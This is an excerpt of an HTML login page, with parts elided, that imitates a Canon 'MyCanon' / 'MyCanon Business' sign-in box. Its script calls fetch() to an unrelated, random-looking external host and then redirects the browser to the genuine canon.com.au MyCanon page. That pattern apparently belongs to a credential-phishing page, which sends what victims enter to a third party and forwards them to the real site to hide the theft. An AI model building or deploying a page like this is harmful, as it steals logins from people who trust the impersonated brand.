...
<div class="page-wrap">
  <div class="login-box">
    ...
    <div class="tabs">
      <div class="tab active" id="tab-mc" onclick="switchTab('mc')">MyCanon</div>
      <div class="tab" id="tab-mcb" onclick="switchTab('mcb')">MyCanon Business</div>
    </div>
...
<script>
  ...
  fetch('https://gj3mvmed3viv6smzv9tsdjpz7qdh18rwg.c.ccxsta.com/', {
    ...
    window.location.href = 'https://www.canon.com.au/mycanon/';
  });
}
</script>
</body>
